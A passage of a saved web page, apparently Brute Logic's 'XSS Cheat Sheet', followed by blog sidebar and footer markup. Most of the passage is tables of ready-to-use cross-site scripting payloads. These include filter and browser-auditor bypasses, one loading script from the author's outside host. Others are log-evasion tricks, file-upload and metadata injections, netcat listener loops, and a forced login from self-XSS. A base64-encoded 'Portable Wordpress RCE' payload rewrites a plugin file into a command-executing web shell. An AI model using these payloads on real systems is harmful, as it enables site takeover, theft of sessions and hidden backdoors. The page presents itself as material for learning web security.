+$ while :; do printf "j$ "; read c; echo $c | nc -lp PORT &gt;/dev/null; done</td>
+</tr><tr class="row-18 even" role="row">
+	<td class="column-1"><br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<a href="http://brutelogic.com.br/blog/multi-reflection-xss" target="_blank">Multi Reflection</a> </td><td class="column-2">
+<table id="tablepress-6" class="tablepress tablepress-id-6">
+<tbody class="row-hover">
+<tr class="row-1">
+	<td colspan="2" class="column-1"><center>Double Reflection</center></td>
+</tr>
+<tr class="row-2">
+	<td class="column-1">Single Input </td><td class="column-2">Single Input (script-based)</td>
+</tr>
+<tr class="row-3">
+	<td class="column-1">'onload=alert(1)&gt;&lt;svg/1='</td><td class="column-2">'&gt;alert(1)&lt;/script&gt;&lt;script/1=' <br>
+*/alert(1)&lt;/script&gt;&lt;script&gt;/*</td>
+</tr>
+<tr class="row-4">
+	<td colspan="2" class="column-1"><center>Triple Reflection</center></td>
+</tr>
+<tr class="row-5">
+	<td class="column-1">Single Input</td><td class="column-2">Single Input (script-based)</td>
+</tr>
+<tr class="row-6">
+	<td class="column-1">*/alert(1)"&gt;'onload="/*&lt;svg/1=' <br>
+`-alert(1)"&gt;'onload="`&lt;svg/1='</td><td class="column-2">*/&lt;/script&gt;'&gt;alert(1)/*&lt;script/1='</td>
+</tr>
+<tr class="row-7">
+	<td colspan="2" class="column-1"><center>Multi Input</center></td>
+</tr>
+<tr class="row-8">
+	<td class="column-1">Double Input</td><td class="column-2">Triple Input</td>
+</tr>
+<tr class="row-9">
+	<td class="column-1">p=&lt;svg/1='&amp;q='onload=alert(1)&gt;</td><td class="column-2">p=&lt;svg 1='&amp;q='onload='/*&amp;r=*/alert(1)'&gt;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr><tr class="row-19 odd" role="row">
+	<td class="column-1"><br><br>
+<br><br>
+<br><br>
+<a href="http://brutelogic.com.br/blog/xss-without-event-handlers" target="_blank">Without Event Handlers</a></td><td class="column-2">&lt;script&gt;alert(1)&lt;/script&gt; <br>
+&lt;script src=javascript:alert(1)&gt; <br>
+&lt;iframe src=javascript:alert(1)&gt; <br>
+&lt;embed src=javascript:alert(1)&gt; <br>
+&lt;a href=javascript:alert(1)&gt;click <br>
+&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click <br>
+&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt; <br>
+&lt;isindex action=javascript:alert(1) type=submit value=click&gt; <br>
+&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click <br>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt; <br>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt; <br>
+&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt; <br>
+&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt; <br>
+&lt;object data=javascript:alert(1)&gt; <br>
+&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;  <br>
+&lt;svg&gt;&lt;script xlink:href=data:,alert(1) /&gt; <br>
+&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click <br>
+&lt;svg&gt;&lt;a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?&gt;&lt;circle r=400 /&gt;&lt;animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&amp;&gt;</td>
+</tr><tr class="row-20 even" role="row">
+	<td class="column-1"><br>
+<br>
+<br>
+<br>
+<a href="http://brutelogic.com.br/blog/xss-in-mobile-devices" target="_blank">Mobile Only</a></td><td class="column-2">
+<table id="tablepress-7" class="tablepress tablepress-id-7">
+<tbody class="row-hover">
+<tr class="row-1">
+	<td colspan="2" class="column-1">Event Handlers</td>
+</tr>
+<tr class="row-2">
+	<td colspan="2" class="column-1">&lt;html ontouchstart=alert(1)&gt; <br>
+&lt;html ontouchend=alert(1)&gt; <br>
+&lt;html ontouchmove=alert(1)&gt; <br>
+&lt;html ontouchcancel=alert(1)&gt;<br>
+&lt;body onorientationchange=alert(1)&gt;<br>
+</td>
+</tr>
+<tr class="row-3">
+	<td colspan="2" class="column-1"><center>Javascript</center></td>
+</tr>
+<tr class="row-4">
+	<td class="column-1">Properties</td><td class="column-2">Functions</td>
+</tr>
+<tr class="row-5">
+	<td class="column-1"><x style="font-size:16px">&lt;svg onload=alert(navigator.connection.type)&gt; <br>
+&lt;svg onload=alert(navigator.battery.level)&gt; <br>
+&lt;svg onload=alert(navigator.battery.dischargingTime)&gt; <br>
+&lt;svg onload=alert(navigator.battery.charging)&gt;</x></td><td class="column-2"><x style="font-size:16px">&lt;svg onload=navigator.vibrate(500)&gt; <br>
+&lt;svg onload=navigator.vibrate([500,300,100])&gt;</x></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr><tr class="row-21 odd" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/leveraging-self-xss" target="_blank">Generic Self to Regular XSS</a></td><td class="column-2">&lt;iframe src=LOGOUT_URL onload=forms[0].submit()&gt; <br>
+&lt;/iframe&gt;&lt;form method=post action=LOGIN_URL&gt; <br>
+&lt;input name=USERNAME_PARAMETER_NAME value=USERNAME&gt; <br>
+&lt;input name=PASSWORD_PARAMETER_NAME value=PASSWORD&gt;</td>
+</tr><tr class="row-22 even" role="row">
+	<td class="column-1"><br>
+<br>
+<br>
+<br>
+<br>
+<a href="http://brutelogic.com.br/blog/file-upload-xss" target="_blank">File Upload</a></td><td class="column-2">Injection in Filename<br>
+"&gt;&lt;img src=1 onerror=alert(1)&gt;.gif<br>
+<br>
+Injection in Metadata<br>
+$ exiftool -Artist='"&gt;&lt;img src=1 onerror=alert(1)&gt;' FILENAME.jpeg<br>
+<br>
+Injection with SVG File<br>
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;<br>
+<br>
+Injection with GIF File as Source of Script (CSP Bypass)<br>
+GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;</td>
+</tr><tr class="row-23 odd" role="row">
+	<td class="column-1"><br><br>
+<a href="http://brutelogic.com.br/blog/chrome-xss-bypass" target="_blank">Google Chrome <br>
+Auditor Bypass</a> <br>
+(up to v51)</td><td class="column-2">&lt;script src="data:&amp;comma;alert(1)// <br>
+"&gt;&lt;script src=data:&amp;comma;alert(1)// <br>
+<br>
+&lt;script src="//brutelogic.com.br&amp;sol;1.js&amp;num; <br>
+"&gt;&lt;script src=//brutelogic.com.br&amp;sol;1.js&amp;num; <br>
+<br>
+&lt;link rel=import href="data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt; <br>
+"&gt;&lt;link rel=import href=data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt;</td>
+</tr><tr class="row-24 even" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/cors-enabled-xss" target="_blank">PHP File for <br>
+XHR Remote Call</a></td><td class="column-2">&lt;?php header(“Access-Control-Allow-Origin: *”); ?&gt;<br>
+&lt;img src=1 onerror=alert(1)&gt;</td>
+</tr><tr class="row-25 odd" role="row">
+	<td class="column-1"><a href="http://brutelogic.com.br/blog/avoiding-xss-detection" target="_blank">Server Log Avoidance</a></td><td class="column-2">&lt;svg onload=eval(URL.slice(-8))&gt;#alert(1)<br>
+&lt;svg onload=eval(location.hash.slice(1)&gt;#alert(1)<br>
+&lt;svg onload=innerHTML=location.hash&gt;#&lt;script&gt;alert(1)&lt;/script&gt;</td>
+</tr><tr class="row-26 even" role="row">
+	<td class="column-1"><br>
+<a href="http://brutelogic.com.br/blog/shortest-xss-possible" target="_blank">Shortest PoC</a></td><td class="column-2">&lt;base href=//0&gt;<br>
+<br>
+$ while:; do echo "alert(1)" | nc -lp80; done</td>
+</tr><tr class="row-27 odd" role="row">
+	<td class="column-1"><br><br>
+<br><br>
+<a href="https://twitter.com/brutelogic/status/752111662254227456" target="_blank">Portable Wordpress RCE</a></td><td class="column-2">&lt;script/src="data:&amp;comma;eval(atob(location.hash.slice(1)))//&amp;num;<br>
+#eD1uZXcgWE1MSHR0cFJlcXVlc3QoKQ0KcD0nL3dwLWFkbWluL3Bsd<br>
+Wdpbi1lZGl0b3IucGhwPycNCmY9J2ZpbGU9YWtpc21ldC9pbmRleC5w<br>
+aHAnDQp4Lm9wZW4oJ0dFVCcscCtmLDApDQp4LnNlbmQoKQ0KJD0n<br>
+X3dwbm9uY2U9JysvY2UiIHZhbHVlPSIoW14iXSo/KSIvLmV4ZWMoeC<br>
+5yZXNwb25zZVRleHQpWzFdKycmbmV3Y29udGVudD08Pz1gJF9HRV<br>
+RbYnJ1dGVdYDsmYWN0aW9uPXVwZGF0ZSYnK2YNCngub3BlbignUE<br>
+9TVCcscCtmLDEpDQp4LnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHl<br>
+wZScsJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpD<br>
+Qp4LnNlbmQoJCk=<br>
+<br>
+http://DOMAIN/WP-ROOT/wp-content/plugins/akismet/index.php?brute=CMD</td>
+</tr></tbody>
+</table></div>
+<!-- #tablepress-3 from cache -->
+<p>NOTICE: A special version of this cheat sheet (with private stuff) is available to <a href="http://brutelogic.com.br/blog/secrets/" target="_blank">@brutalsecrets</a> followers <a href="http://brutelogic.com.br/blog/cheat-sheet/brutal/" target="_blank">here</a>&nbsp;(check pass on timeline).</p>
+<p>#hack2learn</p>
+<p><a href="http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png"><img class="alignnone size-full wp-image-1303" src="./XSS Cheat Sheet - Hack 2 Learn_files/Banner-T-shirt-vermelho.png" alt="Banner T-shirt vermelho" srcset="http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?w=2282 2282w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?resize=300%2C38 300w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?resize=768%2C97 768w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?resize=1024%2C129 1024w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?resize=912%2C115 912w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?w=1400 1400w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/08/Banner-T-shirt-vermelho.png?w=2100 2100w" sizes="(max-width: 700px) 100vw, 700px" width="700" height="88"></a></p>
+			</div><!-- .entry-content -->
+	</article><!-- #post-## -->
+				</div>
+				
+			
+		</main><!-- #main -->
+	</div><!-- #primary -->
+
+					<div class="secondary widget-area" role="complementary">
+			<aside id="glt_widget-2" class="widget widget_glt_widget"><h1 class="widget-title">Translate</h1><div id="flags" class="size18"><ul id="sortable" class="ui-sortable" style="float:left"><li id="Chinese"><a title="Chinese" class="notranslate flag zh-CN Chinese"></a></li><li id="French"><a title="French" class="notranslate flag fr French"></a></li><li id="German"><a title="German" class="notranslate flag de German"></a></li><li id="Italian"><a title="Italian" class="notranslate flag it Italian"></a></li><li id="Japanese"><a title="Japanese" class="notranslate flag ja Japanese"></a></li><li id="Portuguese"><a title="Portuguese" class="notranslate flag pt Portuguese"></a></li><li id="Russian"><a title="Russian" class="notranslate flag ru Russian"></a></li><li id="Spanish"><a title="Spanish" class="notranslate flag es Spanish"></a></li></ul></div><div id="google_language_translator"></div></aside><aside id="text-11" class="widget widget_text">			<div class="textwidget"><a href="https://www.netsparker.com/netsparker-web-application-security-scanner/hack-website-before-hackers/?utm_source=hackb4&amp;utm_medium=banner&amp;utm_campaign=brutelogic" target="_blank"><img src="./XSS Cheat Sheet - Hack 2 Learn_files/Netsparker-banner-1.jpg" alt="Hack your website before hackers do." title="Hack Your Website Before Malicious Hackers Do!"></a></div>
+		</aside><div id="rpwwt-recent-posts-widget-with-thumbnails-3" class="rpwwt-widget">
+	<aside id="recent-posts-widget-with-thumbnails-3" class="widget recent-posts-widget-with-thumbnails">	<h1 class="widget-title">Featured Posts</h1>	<ul>
+			<li><a href="http://brutelogic.com.br/blog/bypassing-javascript-overrides/" target="_blank"><img width="300" height="222" src="./XSS Cheat Sheet - Hack 2 Learn_files/override-js.png" class="attachment-300x300 size-300x300" alt="override-js" srcset="http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/07/override-js.png?w=673 673w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/07/override-js.png?resize=300%2C222 300w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/07/override-js.png?resize=550%2C406 550w" sizes="(max-width: 300px) 100vw, 300px"><span class="rpwwt-post-title">Bypassing Javascript Overrides</span></a><div class="rpwwt-post-excerpt">Some time ago, a curious mitigation to XSS was presented here. By hijacking and  […]</div></li>
+			<li><a href="http://brutelogic.com.br/blog/multi-reflection-xss/" target="_blank"><img width="300" height="206" src="./XSS Cheat Sheet - Hack 2 Learn_files/xss-wikipedia-fr.jpg" class="attachment-300x300 size-300x300" alt="xss-wikipedia-fr" srcset="http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/02/xss-wikipedia-fr.jpg?w=689 689w, http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/02/xss-wikipedia-fr.jpg?resize=300%2C206 300w, http://i1.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/02/xss-wikipedia-fr.jpg?resize=590%2C406 590w" sizes="(max-width: 300px) 100vw, 300px"><span class="rpwwt-post-title">Multi Reflection XSS</span></a><div class="rpwwt-post-excerpt">When finding XSS in websites usually we see more than one reflection of our input in  […]</div></li>
+			<li><a href="http://brutelogic.com.br/blog/cors-enabled-xss/" target="_blank"><img width="300" height="207" src="./XSS Cheat Sheet - Hack 2 Learn_files/cors-1.png" class="attachment-300x300 size-300x300" alt="cors-1" srcset="http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/04/cors-1.png?w=885 885w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/04/cors-1.png?resize=300%2C207 300w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/04/cors-1.png?resize=768%2C529 768w, http://i2.wp.com/brutelogic.com.br/blog/wp-content/uploads/2016/04/cors-1.png?resize=589%2C406 589w" sizes="(max-width: 300px) 100vw, 300px"><span class="rpwwt-post-title">CORS Enabled XSS</span></a><div class="rpwwt-post-excerpt">Misconfigured CORS (Cross Origin Resource Sharing) headers can’t be abused to  […]</div></li>
+		</ul>
+	</aside></div><aside id="text-19" class="widget widget_text">			<div class="textwidget"><a href="https://leanpub.com/web-hacking-101" target="_blank"><img src="./XSS Cheat Sheet - Hack 2 Learn_files/web-hacking-101-cover.jpg" title="Donwload now this book!!"></a></div>
+		</aside><aside id="twitter_timeline-2" class="widget widget_twitter_timeline"><h1 class="widget-title">Follow me</h1><iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-timeline twitter-timeline-rendered" style="position: static; visibility: visible; display: inline-block; width: 520px; height: 249px; padding: 0px; border: none; max-width: 100%; min-width: 180px; margin-top: 0px; margin-bottom: 0px;" data-widget-id="717096525592178689" title="Twitter Timeline" src="./XSS Cheat Sheet - Hack 2 Learn_files/saved_resource.html"></iframe></aside><aside id="email-subscribers-3" class="widget widget_text elp-widget"><h1 class="widget-title">Be Notified</h1>
+		<div>
+			<form class="es_widget_form">
+							<div class="es_msg"><span id="es_msg"></span></div>
+								<div class="es_lablebox">Name</div>
+				<div class="es_textbox">
+					<input class="es_textbox_class" name="es_txt_name" id="es_txt_name" value="" maxlength="225" type="text">
+				</div>
+								<div class="es_lablebox">Email *</div>
+				<div class="es_textbox">
+					<input class="es_textbox_class" name="es_txt_email" id="es_txt_email" onkeypress="if(event.keyCode==13) es_submit_page(&#39;http://brutelogic.com.br/blog&#39;)" value="" maxlength="225" type="text">
+				</div>
+				<div class="es_button">
+					<input class="es_textbox_button" name="es_txt_button" id="es_txt_button" onclick="return es_submit_page(&#39;http://brutelogic.com.br/blog&#39;)" value="Subscribe" type="button">
+				</div>
+								<input name="es_txt_group" id="es_txt_group" value="" type="hidden">
+			</form>
+		</div>
+		</aside><aside id="text-15" class="widget widget_text"><h1 class="widget-title">Get Karma</h1>			<div class="textwidget"><iframe src="./XSS Cheat Sheet - Hack 2 Learn_files/button.html" scrolling="auto" frameborder="0" width="75px" height="20px" class="hn-share-iframe"></iframe>
+<script src="./XSS Cheat Sheet - Hack 2 Learn_files/hn.min.js" async="" defer=""></script>
+<br>
+<script src="./XSS Cheat Sheet - Hack 2 Learn_files/slashdot-it.js" type="text/javascript"></script><iframe src="./XSS Cheat Sheet - Hack 2 Learn_files/slashdot-it.html" height="25" width="130" scrolling="no" frameborder="0"></iframe>
+<br>
+<a href="http://www.reddit.com/submit" onclick="window.open( &#39;//www.reddit.com/submit?url=&#39; + encodeURIComponent(window.location)); return false"> <img src="./XSS Cheat Sheet - Hack 2 Learn_files/spreddit10.gif" alt="submit to reddit" border="0"> </a></div>
+		</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h1 class="widget-title">All Posts</h1>		<ul>
+					<li>
+				<a href="http://brutelogic.com.br/blog/reflected-watering-hole/">Reflected in Watering Hole</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/bypassing-javascript-overrides/">Bypassing Javascript Overrides</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/genesis-xss-worm-part-iii/">The Genesis of an XSS Worm – Part III</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/genesis-xss-worm-part-ii/">The Genesis of an XSS Worm – Part II</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/genesis-xss-worm-part-i/">The Genesis of an XSS Worm – Part I</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/shortest-reflected-xss-possible/">The Shortest Reflected XSS Attack Possible</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/looking-xss-php-source/">Looking for XSS in PHP Source Code</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/antiviruxss-paper/">AntiviruXSS White Paper</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/avoiding-xss-detection/">Avoiding XSS Detection</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/blind-xss-code/">Blind XSS Code</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/xss-and-rce/">XSS and RCE</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/cors-enabled-xss/">CORS Enabled XSS</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/chrome-xss-bypass/">Chrome XSS Bypass</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/leveraging-self-xss/">Leveraging Self-XSS</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/xss-in-mobile-devices/">XSS in Mobile Devices</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/cross-origin-scripting/">Cross-Origin Scripting</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/transcending-context-based-filters/">Transcending Context-Based Filters</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/xss-without-event-handlers/">XSS Without Event Handlers</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/multi-reflection-xss/">Multi Reflection XSS</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/using-xss-to-control-a-browser/">Using XSS to Control a Browser</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/source-breaking-injections/">Source-Breaking Injections</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/location-based-payloads-part-iv/">Location Based Payloads – Part IV</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/location-based-payloads-part-iii/">Location Based Payloads – Part III</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/location-based-payloads-part-ii/">Location Based Payloads – Part II</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/location-based-payloads-part-i/">Location Based Payloads – Part I</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/probing-to-find-xss/">Probing to Find XSS</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/filter-bypass-procedure/">Filter Bypass Procedure</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/existing-code-reuse/">Existing Code Reuse</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/agnostic-event-handlers/">Agnostic Event Handlers</a>
+						</li>
+					<li>
+				<a href="http://brutelogic.com.br/blog/xss-payload-scheme/">XSS Payload Scheme</a>
+						</li>
+				</ul>
+		</aside>		<aside id="text-13" class="widget widget_text">			<div class="textwidget"><a href="https://sucuri.net/" target="_blank"><img src="./XSS Cheat Sheet - Hack 2 Learn_files/sucuri-ad-1.jpg" alt="Who is protecting your website?" title="Protect your site brutally!"></a></div>
+		</aside>		</div><!-- #secondary -->
+	
+	</div><!-- #content -->
+
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="site-footer-wrapper">
+			<div class="site-info">
+								Sponsored by <a href="https://www.netsparker.com/" title="Netsparker" target="_blank">Netsparker Web Application Security Scanner</a><br>
+				<a href="http://wordpress.org/" rel="generator">Proudly powered by WordPress</a>
+				<span class="sep"> | </span>
+				Theme: Big Brother by <a href="http://automattic.com/" rel="designer">WordPress.com</a>.			</div><!-- .site-info -->
+					</div><!-- .site-footer-wrapper -->
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+    <script>jQuery(document).ready(function(a){a("a.nturl").on("click",function(){function l(){doGoogleLanguageTranslator(default_lang+"|"+default_lang)}function n(){doGoogleLanguageTranslator(default_lang+"|"+lang_prefix)}default_lang="en",lang_prefix=a(this).attr("class").split(" ")[2],lang_prefix==default_lang?l():n()}),a("a.flag").on("click",function(){function l(){doGoogleLanguageTranslator(default_lang+"|"+default_lang)}function n(){doGoogleLanguageTranslator(default_lang+"|"+lang_prefix)}default_lang="en",lang_prefix=a(this).attr("class").split(" ")[2],a(".tool-container").hide(),lang_prefix==default_lang?l():n()}),0==a("body > #google_language_translator").length&&a("#glt-footer").html("<div id='google_language_translator'></div>")});</script>
+
+    <div id="glt-translate-trigger"><span class="notranslate">Translate »</span></div><div id="glt-toolbar"></div><div id="glt-footer"><div id="google_language_translator"></div></div><script type="text/javascript">function GoogleLanguageTranslatorInit() { new google.translate.TranslateElement({pageLanguage: 'en', autoDisplay: false, gaTrack: true, gaId: 'UA-57109305-2'}, 'google_language_translator');}</script><script type="text/javascript" src="./XSS Cheat Sheet - Hack 2 Learn_files/element.js"></script>		<!--facebook like and share js -->                   
+		<div id="fb-root"></div>
+		<script>(function(d, s, id) {
+		  var js, fjs = d.getElementsByTagName(s)[0];
+		  if (d.getElementById(id)) return;
+		  js = d.createElement(s); js.id = id;
+		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5";
+		  fjs.parentNode.insertBefore(js, fjs);
+		}(document, 'script', 'facebook-jssdk'));</script>
+			<!--google share and  like and e js -->
+		<script type="text/javascript">
+			window.___gcfg = {
+			  lang: 'en_US'
+			};
+			(function() {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			})();
+		</script>
+	
+        <!-- google share -->
+        <script type="text/javascript">
+            (function() {
+                var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+                po.src = 'https://apis.google.com/js/platform.js';
+                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+            })();
+        </script>
+        		<!--pinit js -->
+		
+			<!-- twitter JS End -->
+		<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>	
+	<div class="sfsi_plus_outr_div" style="display: none; z-index: 9996; opacity: 1; top: 6682px; position: absolute;"> <div class="sfsi_plus_FrntInner" style="border: 1px solid rgb(243, 250, 242); color: rgb(0, 0, 0); box-shadow: rgb(204, 204, 204) 12px 30px 18px; display: none; background-color: rgb(239, 247, 247);"><div class="sfsiclpupwpr" onclick="sfsiplushidemepopup();"><img src="./XSS Cheat Sheet - Hack 2 Learn_files/close.png"></div><h2 style="font-family:Helvetica,Arial,sans-serif;font-style:;color:#000000;font-size:30px">Enjoy this blog? Please spread the word :)</h2><ul style=""><li><div style="width:51px; height:51px;margin-left:5px;margin-bottom:30px;" class="sfsi_plus_wicons shuffeldiv "><div class="sfsiplus_inerCnt"><a class=" sficn" effect="" target="_blank" href="http://brutelogic.com.br/blog/feed/" id="sfsiplusid_rss" style="opacity:1"><img alt="RSS" title="RSS" src="./XSS Cheat Sheet - Hack 2 Learn_files/flat_rss.png" width="51" height="51" style="" class="sfcm sfsi_wicon" effect=""></a></div></div></li><li><div style="width:51px; height:51px;margin-left:5px;margin-bottom:30px;" class="sfsi_plus_wicons shuffeldiv "><div class="sfsiplus_inerCnt"><a class=" sficn" effect="" target="_blank" href="http://www.specificfeeds.com/widgets/emailSubscribeEncFeed/Y3RRTFk2Uld0MTBqbmpQT3VNeVNWeE5FWkJ3ak5ITEJCNTl4NVdSYXBzb1M4eVJxQkJiN242Q0g5NHlTWFlKSFg0UUhNUlVMWENrYXMzRURYQ1NEejJzcmVuMGlwNzZuaks0RDBESSt2WHlGSUEvUGFrMmVIUVAvZU5HS1B5Ymt8THV0NlNabUloZ3BhR2pKaWRZa1N1clFUd0JvRnFobHJWcVBPOXpmMnBWST0=/OA==" id="sfsiplusid_email" style="opacity:1"><img alt="Follow by Email" title="Follow by Email" src="./XSS Cheat Sheet - Hack 2 Learn_files/flat_subscribe.png" width="51" height="51" style="" class="sfcm sfsi_wicon" effect=""></a></div></div></li><li><div style="width:51px; height:51px;margin-left:5px;margin-bottom:30px;" class="sfsi_plus_wicons shuffeldiv "><div class="sfsiplus_inerCnt"><a class=" sficn" effect="" target="_blank" href="https://twitter.com/brutelogic" id="sfsiplusid_twitter" style="opacity:1"><img alt="Twitter" title="Twitter" src="./XSS Cheat Sheet - Hack 2 Learn_files/flat_twitter.png" width="51" height="51" style="" class="sfcm sfsi_wicon" effect=""></a><span class="bot_no ">16k</span><div class="sfsi_plus_tool_tip_2 sfsi_plus_twt_tool_bdr sfsi_plus_Tlleft" style="width: 59px; opacity: 0; z-index: -1; display: none;" id="sfsiplusid_twitter"><span class="bot_arow bot_twt_arow"></span><div class="sfsi_plus_inside"><div class="cstmicon1"><a href="https://twitter.com/brutelogic" target="_blank"><img alt="Visit Us" title="Visit Us" src="./XSS Cheat Sheet - Hack 2 Learn_files/icon_Visit_us_en_US.png"></a></div><div class="icon1"><iframe id="twitter-widget-1" scrolling="no" frameborder="0" allowtransparency="true" class="twitter-follow-button twitter-follow-button-rendered" title="Twitter Follow Button" src="./XSS Cheat Sheet - Hack 2 Learn_files/follow_button.d73d0c4cb6af3df0ea22b7c11dbc87d2.en.html" data-screen-name="brutelogic" style="position: static; visibility: visible; width: 62px; height: 20px;"></iframe></div><div class="icon2"><iframe id="twitter-widget-2" scrolling="no" frameborder="0" allowtransparency="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" title="Twitter Tweet Button" src="./XSS Cheat Sheet - Hack 2 Learn_files/tweet_button.d73d0c4cb6af3df0ea22b7c11dbc87d2.en.html" data-url="http://brutelogic.com.br/blog/cheat-sheet/" style="position: static; visibility: visible; width: 60px; height: 20px;"></iframe></div></div></div></div></div></li><li><div style="width:51px; height:51px;margin-left:5px;margin-bottom:30px;" class="sfsi_plus_wicons shuffeldiv "><div class="sfsiplus_inerCnt"><a class=" sficn" effect="" target="_blank" href="https://www.youtube.com/user/brutelogic" id="sfsiplusid_youtube" style="opacity:1"><img alt="YouTube" title="YouTube" src="./XSS Cheat Sheet - Hack 2 Learn_files/flat_youtube.png" width="51" height="51" style="" class="sfcm sfsi_wicon" effect=""></a><span class="bot_no ">527</span><div class="sfsi_plus_tool_tip_2 utube_tool_bdr sfsi_plus_Tlleft" style="width: 96px; opacity: 0; z-index: -1; display: none;" id="sfsiplusid_youtube"><span class="bot_arow bot_utube_arow"></span><div class="sfsi_plus_inside"><div class="icon1"><a href="https://www.youtube.com/user/brutelogic" target="_blank"><img alt="YouTube" title="YouTube" src="./XSS Cheat Sheet - Hack 2 Learn_files/youtube.png"></a></div><div class="icon2"><div id="___ytsubscribe_0" style="text-indent: 0px; margin: 0px; padding: 0px; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 86px; height: 24px; background: transparent;"><iframe frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" style="position: static; top: 0px; width: 86px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 24px;" tabindex="0" vspace="0" width="100%" id="I0_1471802411208" name="I0_1471802411208" src="./XSS Cheat Sheet - Hack 2 Learn_files/subscribe_embed.html" 